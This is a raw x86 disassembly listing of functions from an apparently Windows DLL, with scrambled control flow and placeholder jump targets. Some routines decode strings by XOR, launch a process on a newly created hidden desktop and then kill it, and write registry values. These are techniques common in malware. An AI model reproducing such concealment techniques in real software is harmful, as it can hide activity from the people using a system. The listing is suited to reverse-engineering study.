call sub_10041880
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_1004b2a0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov eax esi
xor edx edx
mov [ eax + edi * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + edi * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10046ed7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10046f10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_10046f10
mov esi [ esi ]
push edi
call sub_100187af
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_10046f48
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10040209
jmp r-xdata
sub_10046fd0
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov ecx [ r--data ]
mov ebx edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe7
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
push eax
push __dos_header
push eax
push eax
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x10 ] ax
call [ CreateDesktopW@IAT ]
mov esi eax
mov [ ebp - 0x254 ] esi
test esi esi
jne r-xdata
push 0x44
lea edx [ ebp - 0x2b0 ]
push 0x0
push edx
call sub_1007f940
xor eax eax
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] eax
add esp 0xc
lea edx [ ebp - 0x3c ]
mov eax 0xf
mov [ ebp - 0x2b0 ] 0x44
call sub_10045930
mov eax edx
lea ecx [ ebp - 0x264 ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edi
push 0x0
mov [ ebp - 0x2a8 ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov eax 0x43
call sub_10045930
lea ecx [ ebp - 0x254 ]
mov eax edx
push ecx
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x24c ] eax
call sub_1003c220
add esp 0x4
cmp [ ebp - 0x250 ] 0x0
jne r-xdata
push esi
call [ CloseDesktop@IAT ]
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x248 ]
push eax
call [ SysAllocString@IAT ]
mov esi [ PostMessageW@IAT ]
push 0x0
push 0x0
mov [ ebx ] eax
mov ecx [ ebp - 0x250 ]
push 0x10
push ecx
call esi
mov edx [ ebp - 0x250 ]
push 0x0
push 0x0
push 0x12
push edx
call esi
mov edi [ Sleep@IAT ]
mov ebx [ IsWindow@IAT ]
xor esi esi
mov edx [ ebp - 0x264 ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ ebp - 0x264 ]
push ecx
call esi
mov edx [ ebp - 0x254 ]
push edx
call [ CloseDesktop@IAT ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ ebp - 0x264 ]
push edx
call esi
mov eax [ ebp - 0x254 ]
push eax
jmp r-xdata
inc esi
cmp esi 0x12c
jl r-xdata
call [ CloseDesktop@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x64
call edi
mov eax [ ebp - 0x250 ]
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x264 ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
mov edx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ ebp - 0x264 ]
push eax
call esi
mov ecx [ ebp - 0x254 ]
push ecx
sub_10047220
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_1007ec90
mov eax [ ebp + 0x8 ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ edi ] eax
mov eax edi
pop ebp
retn 0x4
sub_10047250
push ebp
mov ebp esp
push 0xffffffff
push sub_1008646b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1001613a
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1001f84c
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_1006a233
mov [ edi ] eax
call sub_1001706d
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10034e98
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10069747
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10047340
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
xor eax eax
pop esi
retn
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_10047370
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
call sub_100791c0
inc [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi ]
sub eax edi
lea edx [ eax * 4 - 0x4 ]
lea ecx [ ecx + edi * 4 ]
push edx
push ecx
add ecx 0x4
push ecx
call sub_1007ec90
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
add esp 0xc
mov [ eax + edi * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100473b3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1005bb4f
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1001e7b9
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1005bb4f
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1005bb4f
push 0x1
mov edi eax
call sub_1005bb4f
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1002d7c8
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10047450
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20106
push 0x0
push 0x0
push 0x0
push eax
push edx
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push eax
push 0x0
push ecx
push edx
call [ RegSetValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x3
sub_100474f0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0x54 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x5c ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0xe8 ]
call sub_1005ddc0
mov ecx [ ebp - 0x5c ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0x54 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0x50 ]
mov eax 0x1c
mov [ ebp - 0x54 ] 0x0
call sub_10053240
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x58 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x60 ] ecx
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0x60 ]
lea ecx [ ebx + 0x104 ]
sar eax 0x1
push eax
push edx
call sub_1005ddc0
mov edx [ ebp - 0x58 ]
push edx
call edi
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebx + 0xf8 ]
push r--data
xor edi edi
lea ecx [ ebx + 0xe8 ]
mov [ ebp - 0x54 ] 0x0
call sub_1001a2f0
test eax eax
jne r-xdata
mov eax [ ebx + 0x114 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x104 ]
call sub_1001a2f0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
xor ecx ebp
add eax 0x4
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100476aa
push 0x6c
mov eax sub_100856bc
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10002fc0
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_10034a80
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_100101d0
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_100578b0
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_1005e672
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004642f
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005a5dc
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005a5dc
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1002c8c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_100578b0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_1001c121
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_1001c121
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005a5dc
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001c121
sub_10047d50
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
xor ecx ecx
test al 0x1
je r-xdata
xor eax 0xedb88320
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
shr eax 0x1
shr eax 0x1
xor eax 0xedb88320
jmp r-xdata
test al 0x1
je r-xdata
mov eax ecx
shr eax 0x1
test cl 0x1
je r-xdata
or eax 0xffffffff
test edx edx
je r-xdata
mov [ ebp + ecx * 4 - 0x404 ] eax
inc ecx
cmp ecx 0x100
jl r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
not eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
movzx ecx [ esi ]
xor ecx eax
and ecx 0xff
shr eax 0x8
xor eax [ ebp + ecx * 4 - 0x404 ]
inc esi
dec edx
jne r-xdata
sub_10047e30
test ebx ebx
je r-xdata
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
